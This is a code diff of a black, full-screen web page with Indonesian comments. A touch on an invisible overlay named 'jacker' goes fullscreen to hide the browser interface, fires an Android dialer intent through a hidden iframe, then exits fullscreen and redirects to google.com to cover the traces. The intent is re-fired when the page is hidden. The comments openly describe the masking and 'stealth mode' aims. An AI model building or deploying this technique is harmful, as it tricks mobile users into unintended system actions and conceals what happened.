@@ -5,52 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>S Y S T E M</title>
     <style>
+        /* UI Hitam Pekat untuk masking sempurna */
         body, html { 
             margin: 0; padding: 0; background: #000; 
             width: 100vw; height: 100vh; overflow: hidden;
+            touch-action: none;
         }
-        #trigger {
-            width: 100%; height: 100%; cursor: pointer;
+        #jacker {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 9999; cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <div id="trigger"></div>
+    <div id="jacker"></div>
 
 <script>
-    const trigger = document.getElementById('trigger');
+    const jacker = document.getElementById('jacker');
 
-    trigger.addEventListener('touchstart', function() {
-        // 1. Fullscreen untuk 'membutakan' UI browser
+    jacker.addEventListener('touchstart', function() {
+        // 1. Masuk Fullscreen (Menyamarkan transisi sistem)
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen();
         }
 
+        // 2. Konstruksi Intent (Contoh: Dialer)
         const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
 
-        // 2. Gunakan Iframe tersembunyi untuk memicu Intent tanpa mengganggu loading
+        // 3. Eksekusi via Iframe tersembunyi
+        // Iframe memungkinkan intent dipicu tanpa menghentikan eksekusi skrip utama
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = intentUrl;
         document.body.appendChild(iframe);
 
-        // 3. Teknik 'Race Condition': Redirect segera setelah pemicuan
-        // Kita beri delay sangat kecil (50ms) agar Iframe sempat memanggil sistem Android
+        // 4. Tahap Pembersihan & Redirect (Stealth Mode)
+        // Kita gunakan delay 100ms agar Iframe punya waktu untuk berkomunikasi dengan OS Android
         setTimeout(() => {
-            // Keluar dari fullscreen agar transisi ke Google terlihat normal
+            // Keluar dari Fullscreen agar transisi ke Google terlihat natural
             if (document.exitFullscreen) {
                 document.exitFullscreen();
             }
             
-            // Redirect Utama
+            // Langsung buang ke Google.com
+            // Ini akan menimpa jejak Intent Picker jika muncul sedikit lag
             window.location.replace("https://www.google.com");
-        }, 50);
+        }, 100);
 
-        // 4. Fallback: Jika Iframe gagal, picu lagi tepat sebelum halaman berpindah
-        window.onbeforeunload = function() {
+        // 5. Fallback terakhir: Jika navigasi gagal, paksa Intent lagi saat halaman ditutup
+        window.addEventListener('pagehide', () => {
             window.location.href = intentUrl;
-        };
+        });
     });
 </script>
 </body>
